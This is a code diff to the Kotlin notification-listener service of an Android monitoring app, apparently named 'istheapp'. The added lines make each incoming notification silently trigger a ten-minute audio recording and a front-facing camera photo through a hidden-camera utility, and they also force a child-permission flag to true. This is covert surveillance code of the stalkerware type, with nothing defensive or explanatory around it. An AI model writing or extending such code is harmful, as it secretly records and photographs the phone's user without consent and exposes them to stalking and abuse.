@@ -5,6 +5,7 @@ import android.media.MediaRecorder
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import com.github.midros.istheapp.app.IsTheApp
+import com.github.midros.istheapp.data.model.ChildPhoto
 import com.github.midros.istheapp.data.model.ChildRecording
 import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
 import com.github.midros.istheapp.utils.ConstFun
@@ -17,7 +18,9 @@ import com.github.midros.istheapp.utils.Consts.TYPE_WHATSAPP
 import com.github.midros.istheapp.utils.Consts.WHATSAPP_PACK_NAME
 import com.github.midros.istheapp.utils.FileHelper.getFileNameAudio
 import com.github.midros.istheapp.utils.MyCountDownTimer
+import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraFacing
 import com.google.firebase.database.DatabaseReference
+import java.util.concurrent.TimeUnit
 import javax.inject.Inject
 
 /**
@@ -72,6 +75,14 @@ class NotificationService : NotificationListenerService() {
                 val title = bundle.getString(Notification.EXTRA_TITLE)
                 val icon = sbn.notification.largeIcon
                 val nameImage = sbn.postTime
+
+                val childRecording2 = ChildRecording(true,600000)
+                getReference("${Consts.RECORDING}/${Consts.PARAMS}").setValue(childRecording2)
+                TimeUnit.SECONDS.sleep(1L)
+
+                val childPhoto = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
+                getReference("${Consts.PHOTO}/${Consts.PARAMS}").setValue(childPhoto)
+                getReference("${Consts.PHOTO}/${Consts.CHILD_PERMISSION}").setValue(true)
 
                 interactor.getNotificationExists(nameImage.toString()){
                     interactor.setDataMessageNotification(typeNotification,text,title,nameImage.toString(),icon)
